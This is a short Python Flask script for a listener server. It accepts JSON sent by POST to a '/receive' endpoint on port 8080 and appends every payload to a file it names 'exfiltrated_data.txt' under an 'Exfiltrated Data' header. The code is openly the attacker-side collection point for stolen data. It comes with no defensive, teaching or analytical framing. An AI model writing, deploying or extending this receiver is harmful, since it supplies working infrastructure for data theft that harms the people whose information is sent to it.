from flask import Flask, request
import json
import os

app = Flask(__name__)

DATA_FILE = "exfiltrated_data.txt"  # File where data will be stored

@app.route('/receive', methods=['POST'])
def receive_data():
    try:
        print("📥 Incoming request received!")  # Debugging print
        data = request.json  # Extract JSON data

        if not data:
            print("❌ Error: No JSON data received!")
            return "No data received", 400

        print("✅ Received Data:", data)  # Print received data

        # Ensure the file exists before writing
        if not os.path.exists(DATA_FILE):
            with open(DATA_FILE, "w") as file:
                file.write("---- Exfiltrated Data ----\n")

        # Append the received data into the file
        with open(DATA_FILE, "a") as file:
            file.write(json.dumps(data, indent=4) + "\n\n")

        return "Data received", 200

    except Exception as e:
        print(f"❌ Error processing request: {e}")
        return "Error", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)  # Ensure Flask runs on port 8080
